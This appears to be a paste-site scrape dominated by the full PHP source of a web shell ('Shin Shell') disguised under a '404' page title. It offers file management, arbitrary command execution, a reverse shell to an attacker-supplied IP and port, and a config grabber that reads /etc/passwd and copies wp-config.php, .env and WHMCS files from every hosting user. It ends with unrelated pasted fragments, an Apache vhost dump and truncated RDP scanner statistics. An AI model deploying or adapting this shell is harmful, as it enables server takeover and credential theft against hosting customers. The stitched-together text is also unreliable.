function readFileContent($file)
{
    return file_get_contents($file);
}

function saveFileContent($file)
{
    if (isset($_POST['content'])) {
        return file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}
function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        $currentDirectory = getCurrentDirectory();
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) {
            return 'Open Ur Eyes Bitch !!!.';
        } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully.';
        } else {
            return 'Error uploading file.';
        }
    }
    return '';
    }
}
function changeDirectory($path)
{
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}
function getCurrentDirectory()
{
    return realpath(getcwd());
}
function getLink($path, $name)
{
    if (is_dir($path)) {
        return '<a href=""?dir=' . urlencode($path) . '"">' . $name . '</a>';
    } elseif (is_file($path)) {
        return '<a href=""?dir=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '"">' . $name . '</a>';

    }
}
function getDirectoryArray($path)
{
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';
    foreach ($directories as $directory) {
        if (!empty($directory)) {
            $currentPath .= '/' . $directory;
            $directoryArray[] = [
                'path' => $currentPath,
                'name' => $directory,
            ];
        }
    }
    return $directoryArray;
}
function showBreadcrumb($path)
{
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    ?>
    <div class=""breadcrumb"">
        <?php foreach ($paths as $id => $pat) { ?>
            <?php if ($pat == '' && $id == 0) { ?>
             DIR : <a href=""?dir=/"">/</a>
            <?php } ?>
            <?php if ($pat == '') {
                continue;
            } ?>
            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
            <a href=""?dir=<?php echo urlencode($linkPath); ?>""><?php echo $pat; ?></a>/
        <?php } ?>
    </div>
    <?php
}
function showFileTable($path)
{
    $fileDetails = @getFileDetails($path);
    ?>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>            
            <th>Actions</th>
        </tr>
        <?php if (is_array($fileDetails)) { ?>
            <?php foreach ($fileDetails as $fileDetail) { ?>
                <tr>
                	<td>
                	<svg style=""width: 20px; height: 20px; margin-right: 5px;"" xmlns=""http://www.w3.org/2000/svg"" viewBox=""0 0 24 24"" fill=""none"" stroke=""currentColor"" stroke-width=""2"" stroke-linecap=""round"" stroke-linejoin=""round"">
                	<circle cx=""12"" cy=""12"" r=""10""></circle>
                    <line x1=""12"" y1=""16"" x2=""12"" y2=""12""></line>
                    <line x1=""12"" y1=""8"" x2=""12"" y2=""8""></line>
                </svg>
                    <?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
                    
                    <td>
                    	<?php echo $fileDetail['type']; ?></td>
                    <td><?php echo $fileDetail['size']; ?></td>
                    <td>
                        <?php
                        $permissionColor = @is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
                        ?>
                        <span style=""color: <?php echo $permissionColor; ?>""><?php echo $fileDetail['permission']; ?></span>
                        </td>
                    <td>
                            
                        <?php if ($fileDetail['type'] === 'File') { ?>
                            <div class=""dropdown"">
                                <select onchange=""location.href = this.value;"">
                                	<option value="""" selected disabled>Action : </option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>"">Edit</option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>"">Rename</option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>"">Chmod</option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>"">Delete</option>
                                  </select>
                               </div>
                        <?php } ?>
                        <?php if ($fileDetail['type'] === 'Folder') { ?>
                            <div class=""dropdown"">
                                <select onchange=""location.href = this.value;"">
                                	<option value="""" selected disabled>Action : </option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>"">Rename</option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>"">Chmod</option>
                                    <option value=""?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>"">Delete</option>
                                 </select>
                             </div>
                        <?php } ?>
                    </td>
                </tr>
            <?php } ?>
        <?php } else { ?>
            <tr>
                <td colspan=""5"">None</td>
            </tr>
        <?php } ?>
    </table>
    <?php
}
function changePermission($path)
{
    if (!file_exists($path)) {
        return 'File or directory does not exist.';
    }

    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
    
    if ($permission === '') {
        return 'Invalid permission value.';
    }

    if (!is_dir($path) && !is_file($path)) {
        return 'Cannot change permission. Only directories and files can have permissions modified.';
    }

    $parsedPermission = intval($permission, 8);
    if ($parsedPermission === 0) {
        return 'Invalid permission value.';
    }

    if (chmodRecursive($path, $parsedPermission)) {
        return 'Permission changed successfully.';
    } else {
        return 'Error changing permission.';
    }
}
function chmodRecursive($path, $permission)
{
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items === false) {
            return false;
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }

                if (!chmodRecursive($itemPath, $permission)) {
                    return false;
                }
            } else {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }
            }
        }
    } else {
        if (!chmod($path, $permission)) {
            return false;
        }
    }

    return true;
}
function renameFile($oldName, $newName)
{
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (@rename($oldName, $newPath)) {
            return 'File or folder renamed successfully.';
        } else {
            return 'Error renaming file or folder.';
        }
    } else {
        return 'File or folder does not exist.';
    }
}
function deleteFile($file)
{
    if (file_exists($file)) {
        if (@unlink($file)) {
            return 'File deleted successfully.' . $file;
        } else {
            return 'Error deleting file.';
        }
    } else {
        return 'File does not exist.';
    }
}
function deleteFolder($folder)
{
    if (is_dir($folder)) {
        $files = @glob($folder . '/*');
        foreach ($files as $file) {
            is_dir($file) ? deleteFolder($file) : unlink($file);
        }
        if (@rmdir($folder)) {
            return 'Folder deleted successfully.' . $folder;
        } else {
            return 'Error deleting folder.';
        }
    } else {
        return 'Folder does not exist.';
    }
} 
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';
if (isset($_GET['dir'])) {
    changeDirectory($_GET['dir']);
    $currentDirectory = getCurrentDirectory();
}
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $saved = saveFileContent($file);
        if ($saved) {
            $responseMessage = 'File saved successfully.' . $file;
        } else {
            $errorMessage = 'Error saving file.';
        }
    }
}
if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = changePermission($file);
    }
}
if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}
if (isset($_POST['cmd'])) {
    $cmdOutput = executeCommand($_POST['cmd']);
}

if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = @$_POST['new_name'];
        if (is_file($file) || is_dir($file)) {
            $responseMessage = renameFile($file, $newName);
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $currentDirectory = getCurrentDirectory();
        if (is_file($file)) {
            $responseMessage = deleteFile($file);
            echo ""<script>alert('File dihapus');window.location='?dir="" . urlencode($currentDirectory) . ""';</script>"";
            exit;
        } elseif (is_dir($file)) {
            $responseMessage = deleteFolder($file);
            echo ""<script>alert('Folder dihapus');window.location='?dir="" . urlencode($currentDirectory) . ""';</script>"";
            exit;
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}
if (isset($_POST['Summon'])) {
    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $currentPath = @getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'adminer.php';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (@file_put_contents($filePath, $fileContent) !== false) {
     
            $responseMessage = 'File ""' . $fileName . '"" summoned successfully. <a href=""' . $filePath . '"">' . $filePath . '</a>';            
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}
if (isset($_POST['bind'])) {
    $errorMessage = '<p>Attempting Connection...</p>';
    $ip     = $_POST['ip'];
    $port   = (int)$_POST['port']; // Convert port to an integer
    $sockfd = @fsockopen($ip, $port, $errno, $errstr);

    if ($errno != 0) {
        $errorMessage = ""<font color='red'>$errno : $errstr</font>"";
    } else if (!$sockfd) {
        $errorMessage = ""<p>Unexpected error has occurred, connection may have failed.</p>"";
    } else {
        fputs($sockfd, ""{################################################################}\n"");
        fputs($sockfd, ""..:: Shin Shell- Coded By Shin Code ::..\n"");
        fputs($sockfd, ""\n=> Backconnect\n=> Back\n\n"");
        fputs($sockfd, ""{################################################################}\n\n"");

        $dir     = @shell_exec(""pwd"");
        $sysinfo = @shell_exec(""uname -a"");
        $time    = @shell_exec(""time"");
        $len     = 1337;

        fputs($sockfd, ""User connected @ $time\n\n"");

        while (!feof($sockfd)) {
            $cmdPrompt = '[ShinCode]#:> ';
            fputs($sockfd, $cmdPrompt);
            $command = @fgets($sockfd, $len);
            fputs($sockfd, ""\n"" . @shell_exec($command) . ""\n\n"");
        }
        fclose($sockfd);

        // Add success message here if needed
        $responseMessage = ""<p>Connection successful!</p>"";
    }

    echo $errorMessage;
}
if (isset($_POST['create_file']) && isset($_GET['create']) && $_GET['create'] === 'file') {
    $fileName = $_POST['file_name'];
    $currentDirectory = @getCurrentDirectory();
    $filePath = $currentDirectory . '/' . $fileName;

    if (!file_exists($filePath)) {
        if (@file_put_contents($filePath, '') !== false) {
            $responseMessage = 'File created successfully: ' . $fileName;
        } else {
            $errorMessage = 'Failed to create file.';
        }
    } else {
        $errorMessage = 'File already exists: ' . $fileName;
    }
}
if (isset($_POST['create_folder']) && isset($_GET['create']) && $_GET['create'] === 'folder') {
    $folderName = $_POST['folder_name'];
    $currentDirectory = @getCurrentDirectory();
    $folderPath = $currentDirectory . '/' . $folderName;
    if (!file_exists($folderPath)) {
        if (@mkdir($folderPath)) {
            $responseMessage = 'Folder created successfully: ' . $folderName;
        } else {
            $errorMessage = 'Failed to create folder.';
        }
    } else {
        $errorMessage = 'Folder already exists: ' . $folderName;
    }
}
if(isset($_GET['goo']) && $_GET['goo'] == 'config') {
    $etc = @fopen(""/etc/passwd"", ""r"") or die(""<pre><font color=red>Can't read /etc/passwd</font></pre>"");
    $con = @mkdir(""shin_configs"", 0777);
    $isi_htc = ""Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any"";
    $htc = fopen(""shin_configs/.htaccess"", ""w"");
    @fwrite($htc, $isi_htc);

    while ($passwd = fgets($etc)) {
        if ($passwd == """" || !$etc) {
            echo ""<font color=red>Can't read /etc/passwd</font>"";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_shinconfigfig);

            foreach ($user_shinconfigfig[1] as $user_shinconfig) {
                $user_shinconfigfig_dir = ""/home/$user_shinconfig/public_html/"";

                if (is_readable($user_shinconfigfig_dir)) {
                    $grab_config = [
                        ""/home/$user_shinconfig/public_html/wp-config.php"" => ""wordpress"",
                        ""/home/$user_shinconfig/public_html/configuration.php"" => ""joomla-or-whmcs"",
                        ""/home/$user_shinconfig/public_html/blog/wp-config.php"" => ""wordpress"",
                        ""/home/$user_shinconfig/public_html/blog/configuration.php"" => ""joomla"",
                        ""/home/$user_shinconfig/public_html/wp/wp-config.php"" => ""wordpress"",
                        ""/home/$user_shinconfig/public_html/wordpress/wp-config.php"" => ""wordpress"",
                        ""/home/$user_shinconfig/public_html/config.php"" => ""4images"",
                        ""/home/$user_shinconfig/public_html/whmcs/configuration.php"" => ""whmcs"",
                        ""/home/$user_shinconfig/public_html/support/configuration.php"" => ""supportwhmcs"",
                        ""/home/$user_shinconfig/public_html/secure/configuration.php"" => ""securewhmcs"",
                        ""/home/$user_shinconfig/public_html/clients/configuration.php"" => ""clientswhmcs"",
                        ""/home/$user_shinconfig/public_html/client/configuration.php"" => ""clientwhmcs"",
                        ""/home/$user_shinconfig/public_html/billing/configuration.php"" => ""billingwhmcs"",
                        ""/home/$user_shinconfig/public_html/admin/config.php"" => ""Opencart"",
                        ""/home/$user_shinconfig/public_html/.env"" => ""env"",
                        ""/home/$user_shinconfig/public_html/application/config/database.php"" => ""elisab"",
                        ""/home/$user_shinconfig/public_html/includes/config.php"" => ""forum""
                    ];

                    foreach ($grab_config as $config => $nama_config) {
                        $ambil_config = @file_get_contents($config);

                        if ($ambil_config == '') {
                        	if ($ambil_config !== false) {
                        } else {
                        	
                            $file_config = @fopen(""shin_configs/$user_shinconfig-$nama_config.txt"", ""w"");
                            @fputs($file_config, $ambil_config);
                        }
                    }
                }
            }
        }
       }
}
$responseMessage = ""<center><a href='?dir=$currentDirectory/shin_configs'>Done Touch Me</a></center>"";
}
if (isset($_POST['extract-zip'])) {
    $extractZipFile = $_FILES['extract-zip-file']['name'];
    $extractZipPath = $currentDirectory . '/' . $extractZipFile;

    $zip = new ZipArchive;
    if ($zip->open($extractZipPath) === TRUE) {
        $zip->extractTo($currentDirectory);
        $zip->close();
        $responseMessage = 'ZIP file extracted successfully.';
        unlink($extractZipPath); // Delete the uploaded ZIP file after extraction
    } else {
        $errorMessage = 'Error extracting ZIP file.';
    }
}

if (isset($_POST['zip'])) {
    $zipFile = $_POST['zip-file'];
    $zipFileName = $currentDirectory . '/' . basename($zipFile) . '.zip';
    
    $zip = new ZipArchive;
    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
        if (is_dir($zipFile)) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($zipFile));
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($zipFile) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        } elseif (is_file($zipFile)) {
            $zip->addFile($zipFile, basename($zipFile));
        } else {
            $errorMessage = 'Invalid file or directory specified for zipping.';
        }

        $zip->close();
        $responseMessage = 'Files zipped successfully. <a href=""?dir=' . urlencode($currentDirectory) . '&read=' . urlencode($zipFileName) . '"">Download ZIP</a>';
    } else {
        $errorMessage = 'Error zipping files.';
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>404</title>
  <link rel=""stylesheet"" href=""https://rawcdn.githack.com/Jenderal92/Blog-Gan/63073e604b81df6337c1917990a7330d46b22ae9/ganteng.css"">  
</head>
<body>
    <div class=""container"">
        <h1>[ Shin Bypassed ]</h1>
        
        <div class=""menu-icon"" onclick=""toggleSidebar()""></div>
        <hr>
        <div class=""button-container"">
            <form method=""post"" style=""display: inline-block;"">
                <input type=""submit"" name=""Summon"" value=""Adminer"" class=""summon-button"">
            </form>
            <button type=""button"" onclick=""window.location.href='?gas'"" class=""summon-button"">Mail Test</button>
            <button type=""button"" onclick=""window.location.href='?do=bc'"" class=""summon-button"">BC</button>
            <button type=""button"" onclick=""window.location.href='?dir=<?php echo $currentDirectory ?>&goo=config'"" class=""summon-button"">Config</button>
        </div>
        <hr>
        <select onchange=""location.href = this.value;"">
        	<option value="""" selected disabled>Create File Or Folder</option>
        	<option value=""?dir=<?php echo $currentDirectory ?>&create=file"">Create File</option>
            <option value=""?dir=<?php echo $currentDirectory ?>&create=folder"">Create Folder</option>
        </select>
        <select onchange=""location.href = this.value;"">
        	<option value="""" selected disabled>Zipping</option>
        	<option value=""?dir=<?php echo $currentDirectory ?>&hahay=unzip"" <?php echo isset($_GET['hahay']) && $_GET['hahay'] === 'unzip' ? 'selected' : ''; ?>>Un ZIP</option>
        <option value=""?dir=<?php echo $currentDirectory ?>&hahay=extract_zip"" <?php echo isset($_GET['hahay']) && $_GET['hahay'] === 'extract_zip' ? 'selected' : ''; ?>>Extract ZIP</option>
        </select>

        
        <?php
        //mailer
        if (isset($_GET['gas'])) {
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                if (!empty($_POST['email'])) {
                    $xx = rand();
                    $subject = ""Shin Mailer Test - "" . $xx;
                    $message = ""<html><body>"";
                    $message .= ""<h1>Hello, Shin Ganteng</h1>"";
                    $message .= ""<p>from domain : "" . $_SERVER['SERVER_NAME'] . ""</p>"";
                    $message .= ""<p>This is a test email sent from Shin Mailer.</p>"";
                    $message .= ""</body></html>"";
                    $headers = ""MIME-Version: 1.0"" . ""\r\n"";
                    $headers .= ""Content-type:text/html;charset=UTF-8"" . ""\r\n"";
                    if (mail($_POST['email'], $subject, $message,$headers)) {
                        echo ""<b>Send a report to ["" . $_POST['email'] . ""] - $xx</b>"";
                    } else {
                        echo ""<p style='color: red;'>Failed to send the email.</p>"";
                    }
                } else {
                	echo ""<p style='color: red;'>Please provide an email address.</p>"";
                }
            } else {
        ?>
                <h2>Mail Test :</h2>
                <form method=""post"">
                    <input type=""text"" name=""email"" placeholder=""Enter email"" required>
                    <input type=""submit"" value=""Send test &raquo;"">
                </form>
        <?php
            }
        }
        ?>

        <?php if (!empty($errorMessage)) { ?>
            <p style=""color: red;""><?php echo $errorMessage; ?></p>
        <?php } ?>
        	<hr>


        <div class=""upload-cmd-container"">
            <div class=""upload-form"">
                <h2>Upload:</h2>
                <form method=""post"" enctype=""multipart/form-data"">
                    <input type=""file"" name=""file"">
                    <button class=""button"" type=""submit"" name=""upload"">Upload</button>
                </form>
            </div>

            <div class=""cmd-form"">
                <h2>Command:</h2>
                <form method=""post"">
                    <?php echo @get_current_user() . ""@"" . @$_SERVER['REMOTE_ADDR'] . "": ~ $""; ?><input type='text' size='30' height='10' name='cmd'>
                    <input type=""submit"" class=""empty-button"">

                </form>
            </div>
        </div>
        
       <?php
       if (isset($_GET['do']) && ($_GET['do'] == 'bc')) {
       echo""<div id='command-output'>
       	<h2>Back Connect</h2>
       	<p>Back connect will allow you to enter system commands remotely.</p>
       <form method='post'>
       	<table>
       	<tr>
       	<td>IP Address: </td>
             <td><input type='text' name='ip' style='border:1px solid #5C7296; color: #5C7296;background-color:#transparent;font-size:13px;'></td>
                 </tr>
                 <tr>
                     <td>Port: </td>
                     <td><input type='text' name='port' style='border:1px solid #5C7296; color: #5C7296;background-color:#transparent;font-size:13px;'></td>
                 </tr>
                 <tr>
                     <td><input type='submit' name='bind' value='Open Connection' style='border:1px solid #5C7296; color: #5C7296;background-color:#transparent;font-size:13px;'></td>
                 </tr>
             </table>
        </form></div>"";}?>
        <?php
        if (isset($_GET['read'])) {
            $file = $_GET['read'];
            $content = readFileContent($file);
            if ($content !== false) {
                echo '<div class=""command-output"">';
                echo '<pre>' . htmlspecialchars($content) . '</pre>';
                echo '</div>';
            } else {
                echo 'Failed to read the file.';
                }
              }
           ?>
        <?php if (!empty($cmdOutput)) { ?>
            <h3>Command Output:</h3>
            <div class=""command-output"">
                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
            </div>
        <?php } ?>

        <?php if (!empty($responseMessage)) { ?>
            <p class=""response-message"" style=""color: green;""><?php echo $responseMessage; ?></p>
        <?php } ?>
        <?php if (isset($_GET['create']) && $_GET['create'] === 'file') { ?>
    <div class=""rename-form"">
        <h2>Create File:</h2>
        <form method=""post"">
            <input type=""text"" name=""file_name"" placeholder=""New File Name"">
            <input type=""submit"" value=""Create File"" name=""create_file"" class=""button"">
        </form>
    </div>
<?php } ?>
	
<?php if (isset($_GET['create']) && $_GET['create'] === 'folder') { ?>
    <div class=""rename-form"">
        <h2>Create Folder:</h2>
        <form method=""post"">
            <input type=""text"" name=""folder_name"" placeholder=""New Folder Name"">
            <input type=""submit"" value=""Create Folder"" name=""create_folder"" class=""button"">
        </form>
    </div>
<?php } ?>
        <?php if (isset($_GET['rename'])) { ?>
        <div class=""rename-form"">
            <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
            <form method=""post"">
                <input type=""text"" name=""new_name"" placeholder=""New Name"" required>
                <br>
                <input type=""submit"" value=""Rename"" class=""button"">
                <a href=""?dir=<?php echo urlencode(dirname($file)); ?>"" class=""button"">Cancel</a>
            </form>
        </div>
        <?php } ?>
        <?php if (isset($_GET['edit'])) { ?>
            <div class=""edit-file"">
                <h2>Edit File: <?php echo basename($file); ?></h2>
                <form method=""post"">
                    <textarea name=""content"" rows=""10"" cols=""50""><?php echo htmlspecialchars($content); ?></textarea><br>
                    <button class=""button"" type=""submit"">Save</button>
                </form>
            </div>
        <?php } elseif (isset($_GET['chmod'])) { ?>
            <div class=""change-permission"">
                <h2>Change Permission: <?php echo basename($file); ?></h2>
                <form method=""post"">
                    <input type=""hidden"" name=""chmod"" value=""<?php echo urlencode($file); ?>"">
                    <input type=""text"" name=""permission"" placeholder=""Enter permission (e.g., 0770)"">
                    <button class=""button"" type=""submit"">Change</button>
                </form>
            </div>
            <?php } ?>
    <?php if (isset($_GET['hahay']) && $_GET['hahay'] == 'unzip') {?>
    <div class=""extract-zip-form"">
        <h2>Extract ZIP / Zip Files:</h2>
        <form method=""post"" enctype=""multipart/form-data"">
            <label for=""extract-zip-file"">Select ZIP File to Extract:</label>
            <input type=""file"" name=""extract-zip-file"">
            <button class=""button"" type=""submit"" name=""extract-zip"">Extract ZIP</button>
        </form>
    </div>
    <?php } elseif (isset($_GET['hahay']) && $_GET['hahay'] == 'extract_zip') {?>
    <h2>Zip Files / Directories:</h2>
    <form method=""post"">
        <label for=""zip-file"">Select File or Directory to Zip:</label>
        <input type=""text"" name=""zip-file"" placeholder=""Enter file or directory path"" required>
        <button class=""button"" type=""submit"" name=""zip"">Zip</button>
    </form>
    
<?php } ?>

        <hr>
</div>

        <?php
        echo ""<center>"";
        echo ""<h2>Filemanager</h2>"";
        showBreadcrumb($currentDirectory);
        showFileTable($currentDirectory);
        echo ""</center>"";
        ?>
    </div>
    
<div class=""sidebar"" id=""sidebar"">
    <div class=""sidebar-content"">
        <div class=""sidebar-close"">
            <button onclick=""toggleSidebar()"">Close</button>
        </div>
        <div class=""info-container"">
            <h2>Server Info</h2>
            <?php
            function countDomainsInServer()
            {
                $serverName = $_SERVER['SERVER_NAME'];
                $ipAddresses = @gethostbynamel($serverName);

                if ($ipAddresses !== false) {
                    return count($ipAddresses);
                } else {
                    return 0;
                }
            }

            $domainCount = @countDomainsInServer();

            function formatBytes($bytes, $precision = 2)
            {
                $units = array('B', 'KB', 'MB', 'GB', 'TB');

                $bytes = max($bytes, 0);
                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                $pow = min($pow, count($units) - 1);

                $bytes /= (1 << (10 * $pow));

                return round($bytes, $precision) . ' ' . $units[$pow];
            }
            ?>

            <ul class=""info-list"">
                <li>Hostname: <?php echo @gethostname(); ?></li>
                <?php if (isset($_SERVER['SERVER_ADDR'])) : ?>
                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                <?php endif; ?>
                <li>PHP Version: <?php echo @phpversion(); ?></li>
                <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                <?php if (function_exists('disk_total_space')) : ?>
                    <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                    <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                <?php endif; ?>
                <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                <li>System: <?php echo @php_uname(); ?></li>
            </ul>
        </div>
        

        <div class=""info-container"">
            <h2>System Info</h2>
            <ul class=""info-list"">
                <?php
                $features = [
                    'Safe Mode' => @ini_get('safe_mode') ? 'Enabled' : 'Disabled',
                    'Disable Functions' => @ini_get('disable_functions'),
                    'GCC' => function_exists('shell_exec') && @shell_exec('gcc --version') ? 'On' : 'Off',
                    'Perl' => function_exists('shell_exec') && @shell_exec('perl --version') ? 'On' : 'Off',
                    'Python Version' => ($pythonVersion = @shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
                    'PKEXEC Version' => ($pkexecVersion = @shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
                    'Curl' => function_exists('shell_exec') && @shell_exec('curl --version') ? 'On' : 'Off',
                    'Wget' => function_exists('shell_exec') && @shell_exec('wget --version') ? 'On' : 'Off',
                    'Mysql' => function_exists('shell_exec') && @shell_exec('mysql --version') ? 'On' : 'Off',
                    'Ftp' => function_exists('shell_exec') && @shell_exec('ftp --version') ? 'On' : 'Off',
                    'Ssh' => function_exists('shell_exec') && @shell_exec('ssh --version') ? 'On' : 'Off',
                    'Mail' => function_exists('shell_exec') && @shell_exec('mail --version') ? 'On' : 'Off',
                    'cron' => function_exists('shell_exec') && @shell_exec('cron --version') ? 'On' : 'Off',
                    'SendMail' => function_exists('shell_exec') && @shell_exec('sendmail --version') ? 'On' : 'Off',
                ];
                ?>

                <label for=""feature-select"">Select Feature:</label>
                <select id=""feature-select"">
                    <?php foreach ($features as $feature => $status) : ?>
                        <option value=""<?php echo $feature; ?>""><?php echo $feature . ': ' . $status; ?></option>
                    <?php endforeach; ?>
                </select>
            </ul>
        </div>

        <div class=""info-container"">
            <h2>User Info</h2>
            <ul class=""info-list"">
                <li>Username: <?php echo @get_current_user(); ?></li>
                <li>User ID: <?php echo @getmyuid(); ?></li>
                <li>Group ID: <?php echo @getmygid(); ?></li>
            </ul>
        </div>
    </div>
</div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }
        
        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class=""footer"">
    <p>&copy; <?php echo date(""Y""); ?> <a href=""https://www.blog-gan.org/"">Coded By</a> Shin Code.</p>
</div>
</body>
</html>"
9bt5dYxA,configFiles,owensjrw,SSH Config,Monday 1st of January 2024 07:54:10 PM CDT,"VirtualHost configuration:
*:80                   is a NameVirtualHost
         default server owensjrw.com (/etc/apache2/sites-enabled/owensjrw.conf:2)
         port 80 namevhost owensjrw.com (/etc/apache2/sites-enabled/owensjrw.conf:2)
                 alias preprod.owensjrw.com
         port 80 namevhost owensjrw.com (/etc/apache2/sites-enabled/owensjrw.conf:8)
                 alias wpsite.owensjrw.com
*:443                  is a NameVirtualHost
         default server owensjrw.com (/etc/apache2/sites-enabled/owensjrw.conf:15)
         port 443 namevhost owensjrw.com (/etc/apache2/sites-enabled/owensjrw.conf:15)
                 alias wpsite.owensjrw.com
         port 443 namevhost owensjrw.com (/etc/apache2/sites-enabled/owensjrw.conf:51)
                 alias preprod.owensjrw.com
ServerRoot: ""/etc/apache2""
Main DocumentRoot: ""/var/www/html""
Main ErrorLog: ""/var/log/apache2/error.log""
Mutex rewrite-map: using_defaults
Mutex ssl-stapling-refresh: using_defaults
Mutex ssl-stapling: using_defaults
Mutex ssl-cache: using_defaults
Mutex default: dir=""/var/run/apache2/"" mechanism=default 
Mutex mpm-accept: using_defaults
Mutex watchdog-callback: using_defaults
PidFile: ""/var/run/apache2/apache2.pid""
Define: DUMP_VHOSTS
Define: DUMP_RUN_CFG
User: name=""www-data"" id=33
Group: name=""www-data"" id=33
"
pX9QiZbu,2024-01-01_stats.json,rdp_snitch,JSON,Monday 1st of January 2024 06:18:17 PM CDT,"{
  ""ip"": {
    ""74.105.22.130"": 45,
    ""37.34.253.225"": 3,
    ""109.69.7.157"": 6,
    ""58.218.204.183"": 18,
    ""45.227.254.49"": 6,
    ""205.210.31.203"": 9,
    ""96.9.81.231"": 6,
    ""124.225.77.47"": 6,
    ""103.47.194.238"": 3,
    ""167.94.146.59"": 3,
    ""193.30.255.95"": 3,
    ""87.251.75.145"": 6,
    ""139.162.39.215"": 3,
    ""194.165.17.21"": 12,
    ""135.125.216.200"": 3,
    ""185.170.144.3"": 6,
    ""212.70.149.146"": 9,
    ""205.210.31.234"": 9,
    ""116.125.140.72"": 6,
    ""167.248.133.34"": 3,
    ""62.204.41.208"": 12,
    ""194.165.16.11"": 6,
    ""198.74.56.135"": 3,
    ""107.189.160.91"": 3,
    ""101.36.106.136"": 3,
    ""80.15.71.53"": 3,
    ""45.130.83.36"": 3,
    ""181.42.150.114"": 3,
    ""205.210.31.39"": 9,
    ""185.190.24.101"": 3,
    ""45.227.254.26"": 6,
    ""198.235.24.206"": 9,
    ""179.60.147.51"": 3
  },
  ""asn"": {
    ""AS701"": 45,
    ""AS42961"": 3,
    ""AS21183"": 6,
    ""AS4134"": 24,
    ""AS267784"": 12,
    ""AS396982"": 36,
    ""AS131207"": 6,
    ""AS140832"": 3,
    ""AS398705"": 3,
    ""AS209854"": 3,
    ""AS208091"": 6,
    ""AS63949"": 6,
    ""AS48721"": 18,
    ""AS16276"": 3,
    ""AS197414"": 6,
    ""AS204428"": 9,
    ""AS9318"": 6,
    ""AS398324"": 3,
    ""AS59425"": 12,
    ""AS53755"": 3,
    ""AS135377"": 3,
    ""AS3215"": 3,
    ""AS206092"": 3,
    ""AS27651"": 3,
    ""AS211632"": 3,
    ""AS209588"": 3
  },
  ""isp"": {
    ""Verizon Business"": 45,
    ""ZAIN KW"": 3,
    ""Vodafone Network"": 6,
    ""Chinanet"": 18,
    ""Flyservers S.A."": 33,
